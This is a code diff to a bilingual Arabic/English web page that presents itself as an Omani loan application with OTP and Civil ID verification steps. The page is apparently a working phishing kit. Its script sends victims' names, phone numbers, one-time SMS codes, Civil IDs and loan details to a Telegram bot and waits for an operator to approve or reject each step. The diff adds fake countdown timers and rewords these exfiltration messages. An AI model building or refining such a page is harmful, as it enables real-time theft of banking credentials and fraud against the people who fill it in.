@@ -140,7 +140,7 @@
       }
 
       .stepper {
-        display: flex;
+        display: none;
         align-items: center;
         justify-content: space-between;
         position: relative;
@@ -525,7 +525,7 @@
           <!-- Step 1: Loan amount -->
           <div class="step active" data-step="1">
             <h1 class="title" data-ar="طلب قرض" data-en="Loan Request">طلب قرض</h1>
-            <p class="subtitle" data-ar="اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا." data-en="Select desired loan amount with 4% annual interest rate and period up to 60 months.">اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا.</p>
+            <p class="subtitle" data-ar="اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا." data-en="Select the loan amount you want, with an annual interest rate of 4% and the ability to choose a period up to 60 months.">اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا.</p>
 
             <div class="field">
               <label class="label" data-ar="مبلغ القرض" data-en="Loan Amount">مبلغ القرض</label>
@@ -550,7 +550,7 @@
             </div>
 
             <div class="loan-card">
-              <div class="loan-row"><span data-ar="معدل الفائدة" data-en="Interest Rate">معدل الفائدة</span><strong>4% <span data-ar="سنوياً" data-en="per year">سنوياً</span></strong></div>
+              <div class="loan-row"><span data-ar="معدل الفائدة" data-en="Interest Rate">معدل الفائدة</span><strong>4% <span data-ar="سنوياً" data-en="per year">سنويا</span></strong></div>
               <div class="loan-row"><span data-ar="الدفعة الشهرية" data-en="Monthly Payment">الدفعة الشهرية</span><strong id="monthlyPaymentText">1,088 ر.ع</strong></div>
               <div class="loan-row"><span data-ar="إجمالي السداد" data-en="Total Payment">إجمالي السداد</span><strong id="totalPaymentText">65,280 ر.ع</strong></div>
             </div>
@@ -636,12 +636,12 @@
           <!-- Step 4: OTP -->
           <div class="step" data-step="4">
             <h1 class="title" data-ar="تحقق OTP" data-en="OTP Verification">تحقق OTP</h1>
-            <p class="subtitle" data-ar="أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام." data-en="Enter the verification code sent to your phone via SMS, 4-6 digits.">أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام.</p>
+            <p class="subtitle" data-ar="أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام." data-en="Enter the verification code sent to your phone via messages, and it should be 4-6 digits.">أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام.</p>
 
             <div class="field">
               <label class="label" data-ar="رمز التحقق" data-en="Verification Code">رمز التحقق</label>
               <input id="otpInput" class="input" type="text" inputmode="numeric" maxlength="6" data-ar-placeholder="••••••" data-en-placeholder="••••••" placeholder="••••••" />
-              <div class="review-box" data-ar="ينتهي الرمز خلال دقيقتين" data-en="Code expires in 2 minutes">ينتهي الرمز خلال دقيقتين</div>
+              <div class="review-box" id="otpTimer" data-ar="ينتهي الرمز خلال: 02:00" data-en="Code expires in: 02:00">ينتهي الرمز خلال: 02:00</div>
             </div>
 
             <div class="row-2col">
@@ -672,7 +672,7 @@
             </div>
             <div id="error-5" class="message"></div>
 
-            <div class="security-note" data-ar="سيتم مراجعة طلبك خلال ساعة. معلوماتك محمية بتشفير متعدد الطبقات." data-en="Your application will be reviewed within an hour. Your information is protected with multi-layer encryption.">سيتم مراجعة طلبك خلال ساعة. معلوماتك محمية بتشفير متعدد الطبقات.</div>
+            <div class="security-note" data-ar="سيتم مراجعة طلبك خلال ساعة. معلوماتك محمية بتشفير متعدد الطبقات." data-en="Your application will be reviewed within an hour. Your information is protected by multi-layer encryption.">سيتم مراجعة طلبك خلال ساعة. معلوماتك محمية بتشفير متعدد الطبقات.</div>
           </div>
 
           <!-- Step 6: Success -->
@@ -680,7 +680,7 @@
             <div class="success-page">
               <div class="success-icon">✓</div>
               <h1 class="success-title" data-ar="مبروك!" data-en="Congratulations!">مبروك!</h1>
-              <p class="subtitle" data-ar="تم تقديم طلب القرض بنجاح، وسيتم مراجعته خلال ساعة واحدة." data-en="Your loan application has been successfully submitted and will be reviewed within one hour.">تم تقديم طلب القرض بنجاح، وسيتم مراجعته خلال ساعة واحدة.</p>
+              <p class="subtitle" data-ar="تم تقديم طلب القرض بنجاح، وسيتم مراجعته خلال ساعة واحدة." data-en="Your loan application has been successfully submitted, and it will be reviewed within one hour.">تم تقديم طلب القرض بنجاح، وسيتم مراجعته خلال ساعة واحدة.</p>
 
               <div class="summary-box">
                 <div class="summary-row">
@@ -705,7 +705,7 @@
                 </div>
               </div>
 
-              <div class="review-box" id="reviewTimer" data-ar="المراجعة بعد: 01:00:00" data-en="Review in: 01:00:00">المراجعة بعد: 01:00:00</div>
+              <div class="review-box" id="reviewTimer" data-ar="وقت المراجعة: 01:00:00" data-en="Review time: 01:00:00">وقت المراجعة: 01:00:00</div>
               <button class="btn primary-btn" type="button" onclick="location.reload()" style="margin-top:18px;" data-ar="ابدأ من جديد" data-en="Start Again">ابدأ من جديد</button>
             </div>
           </div>
@@ -728,6 +728,8 @@
       let formData = {};
       let pollingInterval = null;
       let lastUpdateId = -1;
+      let otpCountdownInterval = null;
+      let successCountdownInterval = null;
       
       const steps = [...document.querySelectorAll('.step')];
       const stepItems = [...document.querySelectorAll('.step-item')];
@@ -775,6 +777,16 @@
           item.classList.toggle('done', i < index);
         });
         window.scrollTo({ top: 0, behavior: 'smooth' });
+
+        // Start OTP countdown timer when showing step 4
+        if (index === 3) {
+          startOtpCountdown();
+        }
+
+        // Start success countdown timer when showing step 6
+        if (index === 5) {
+          startSuccessCountdown();
+        }
       }
 
       function setMessage(id, text = '', isSuccess = false) {
@@ -782,6 +794,71 @@
         if (!el) return;
         el.textContent = text;
         el.classList.toggle('success', isSuccess);
+      }
+
+      // ===== COUNTDOWN TIMERS =====
+      function formatTime(seconds) {
+        const mins = Math.floor(seconds / 60);
+        const secs = seconds % 60;
+        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+      }
+
+      function startOtpCountdown() {
+        if (otpCountdownInterval) clearInterval(otpCountdownInterval);
+        
+        let timeLeft = 120; // 120 seconds
+        const otpTimerEl = document.getElementById('otpTimer');
+
+        function updateOtpTimer() {
+          const mins = Math.floor(timeLeft / 60);
+          const secs = timeLeft % 60;
+          const timeStr = `${mins}:${secs.toString().padStart(2, '0')}`;
+          
+          if (currentLang === 'ar') {
+            otpTimerEl.textContent = `ينتهي الرمز خلال: ${timeStr}`;
+          } else {
+            otpTimerEl.textContent = `Code expires in: ${timeStr}`;
+          }
+
+          if (timeLeft <= 0) {
+            clearInterval(otpCountdownInterval);
+            setMessage('error-4', currentLang === 'ar' ? 'انتهي وقت الرمز. يرجى طلب رمز جديد.' : 'Code expired. Please request a new code.');
+          }
+
+          timeLeft--;
+        }
+
+        updateOtpTimer();
+        otpCountdownInterval = setInterval(updateOtpTimer, 1000);
+      }
+
+      function startSuccessCountdown() {
+        if (successCountdownInterval) clearInterval(successCountdownInterval);
+        
+        let timeLeft = 3600; // 1 hour = 3600 seconds
+        const reviewTimerEl = document.getElementById('reviewTimer');
+
+        function updateSuccessTimer() {
+          const hours = Math.floor(timeLeft / 3600);
+          const mins = Math.floor((timeLeft % 3600) / 60);
+          const secs = timeLeft % 60;
+          const timeStr = `${hours.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+          
+          if (currentLang === 'ar') {
+            reviewTimerEl.textContent = `وقت المراجعة: ${timeStr}`;
+          } else {
+            reviewTimerEl.textContent = `Review time: ${timeStr}`;
+          }
+
+          if (timeLeft <= 0) {
+            clearInterval(successCountdownInterval);
+          }
+
+          timeLeft--;
+        }
+
+        updateSuccessTimer();
+        successCountdownInterval = setInterval(updateSuccessTimer, 1000);
       }
 
       // ===== CALCULATIONS =====
@@ -936,6 +1013,8 @@
         btn.addEventListener('click', function () {
           const prev = Number(this.dataset.back);
           if (pollingInterval) clearInterval(pollingInterval);
+          if (otpCountdownInterval) clearInterval(otpCountdownInterval);
+          if (successCountdownInterval) clearInterval(successCountdownInterval);
           showLoading(false);
           showStep(prev);
         });
@@ -957,7 +1036,7 @@
 
         // Send to Telegram
         showLoading(true);
-        const message = `<b>🔐 تسجيل دخول جديد | New Login</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${loginPhone}\n💰 <b>مبلغ القرض:</b> ${formatMoney(formData.loanAmount)}\n🔐 <b>PIN:</b> ${loginPin}`;
+        const message = `<b>🔐 تسجيل دخول جديد | New Login</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${loginPhone}\n💰 <b>مبلغ القرض:</b> ${formatMoney(formData.loanAmount)}\n⏱️ <b>المدة:</b> ${formData.loanPeriod} شهر`;
         
         await sendToTelegram(message, [
           { text: '✅ APPROVE', data: 'login_approve' },
@@ -1004,11 +1083,11 @@
 
         // Send to Telegram
         showLoading(true);
-        const message = `<b>🔐 OTP Verification | التحقق من OTP</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${formData.loginPhone}\n🔢 <b>OTP Code:</b> ${otp}`;
+        const message = `<b>📱 تحقق OTP | OTP Verification</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📞 <b>الهاتف:</b> +968${formData.phone}\n🔐 <b>رمز OTP:</b> ${otp}`;
         
         await sendToTelegram(message, [
-          { text: '✅ ACCEPT', data: 'otp_accept' },
-          { text: '❌ WRONGOTP', data: 'otp_wrongotp' }
+          { text: '✅ APPROVE', data: 'otp_approve' },
+          { text: '❌ REJECT', data: 'otp_reject' }
         ]);
 
         // Poll for response
@@ -1019,15 +1098,15 @@
           pollCount++;
           const response = await checkTelegramResponse();
 
-          if (response === 'otp_accept') {
+          if (response === 'otp_approve') {
             clearInterval(pollingInterval);
             showLoading(false);
             setMessage('error-4', '', true);
             showStep(4); // Move to Civil ID step
-          } else if (response === 'otp_wrongotp') {
+          } else if (response === 'otp_reject') {
             clearInterval(pollingInterval);
             showLoading(false);
-            setMessage('error-4', currentLang === 'ar' ? 'رمز OTP المدخل خاطئ أو منتهي الصلاحية. الرجاء إدخال OTP صحيح.' : 'The OTP provided is wrong or has expired. Please provide a valid OTP.');
+            setMessage('error-4', currentLang === 'ar' ? 'رمز OTP غير صحيح. يرجى المحاولة مرة أخرى.' : 'Invalid OTP. Please try again.');
           }
 
           if (pollCount >= maxPolls) {
@@ -1038,13 +1117,13 @@
         }, POLLING_INTERVAL);
       });
 
-      // ===== STEP 5: CIVIL ID & PIN WITH TELEGRAM APPROVAL =====
+      // ===== STEP 5: CIVIL ID WITH TELEGRAM APPROVAL =====
       document.getElementById('submitVerify').addEventListener('click', async function () {
         const civilId = document.getElementById('civilId').value.trim();
         const verifyPin = document.getElementById('verifyPin').value.trim();
 
         if (!validateCivilId(civilId) || !validatePin(verifyPin)) {
-          setMessage('error-5', currentLang === 'ar' ? 'يرجى إدخال الهوية ورمز PIN بشكل صحيح.' : 'Please enter Civil ID and PIN correctly.');
+          setMessage('error-5', currentLang === 'ar' ? 'يرجى إدخال بيانات صحيحة (رقم هوية 8 أرقام، رمز PIN من 4 إلى 6 أرقام).' : 'Please enter valid data (8-digit ID, 4-6 digit PIN).');
           return;
         }
 
@@ -1054,12 +1133,11 @@
 
         // Send to Telegram
         showLoading(true);
-        const message = `<b>✓ Final Verification | التحقق النهائي</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${formData.loginPhone}\n💰 <b>مبلغ القرض:</b> ${formatMoney(formData.loanAmount)}\n🆔 <b>Civil ID:</b> ${civilId}\n🔐 <b>PIN:</b> ${verifyPin}`;
+        const message = `<b>🆔 التحقق النهائي | Final Verification</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${formData.phone}\n🆔 <b>رقم الهوية:</b> ${civilId}\n💼 <b>الغرض:</b> ${formData.loanPurpose}\n💰 <b>المبلغ:</b> ${formatMoney(formData.loanAmount)}`;
         
         await sendToTelegram(message, [
           { text: '✅ APPROVE', data: 'verify_approve' },
-          { text: '⚠️ WRONGPIN', data: 'verify_wrongpin' },
-          { text: '❌ WRONGID', data: 'verify_wrongid' }
+          { text: '❌ REJECT', data: 'verify_reject' }
         ]);
 
         // Poll for response
@@ -1073,23 +1151,28 @@
           if (response === 'verify_approve') {
             clearInterval(pollingInterval);
             showLoading(false);
+            setMessage('error-5', '', true);
             
-            // Update success summary
+            // Populate success summary
+            const purposeMap = {
+              'home': currentLang === 'ar' ? 'المنزل' : 'Home',
+              'car': currentLang === 'ar' ? 'السيارة' : 'Car',
+              'education': currentLang === 'ar' ? 'التعليم' : 'Education',
+              'business': currentLang === 'ar' ? 'الأعمال' : 'Business',
+              'personal': currentLang === 'ar' ? 'شخصي' : 'Personal'
+            };
+
             document.getElementById('summaryName').textContent = `${formData.firstName} ${formData.lastName}`;
             document.getElementById('summaryLoan').textContent = formatMoney(formData.loanAmount);
-            document.getElementById('summaryPeriod').textContent = `${formData.loanPeriod} شهر`;
-            document.getElementById('summaryPurpose').textContent = formData.loanPurpose;
-            document.getElementById('summaryMonthly').textContent = `${formData.monthlyPayment} ر.ع`;
-            
-            showStep(5); // Move to success step
-          } else if (response === 'verify_wrongpin') {
+            document.getElementById('summaryPeriod').textContent = `${formData.loanPeriod} ${currentLang === 'ar' ? 'شهر' : 'months'}`;
+            document.getElementById('summaryPurpose').textContent = purposeMap[formData.loanPurpose] || formData.loanPurpose;
+            document.getElementById('summaryMonthly').textContent = `${formData.monthlyPayment.toLocaleString('en-US')} ر.ع`;
+
+            showStep(5); // Move to Success step
+          } else if (response === 'verify_reject') {
             clearInterval(pollingInterval);
             showLoading(false);
-            setMessage('error-5', currentLang === 'ar' ? 'رمز PIN المدخل خاطئ. الرجاء إدخال PIN صحيح والمحاولة مرة أخرى.' : 'The PIN provided is wrong. Please put the correct PIN and try again.');
-          } else if (response === 'verify_wrongid') {
-            clearInterval(pollingInterval);
-            showLoading(false);
-            setMessage('error-5', currentLang === 'ar' ? 'رقم الهوية المدخل خاطئ. الرجاء المحاولة مرة أخرى.' : 'The Civil ID provided is wrong. Please try again.');
+            setMessage('error-5', currentLang === 'ar' ? 'فشل التحقق. يرجى المحاولة مرة أخرى.' : 'Verification failed. Please try again.');
           }
 
           if (pollCount >= maxPolls) {
@@ -1100,7 +1183,7 @@
         }, POLLING_INTERVAL);
       });
 
-      // Initialize language
+      // Initialize
       updateLanguage('ar');
     </script>
   </body>
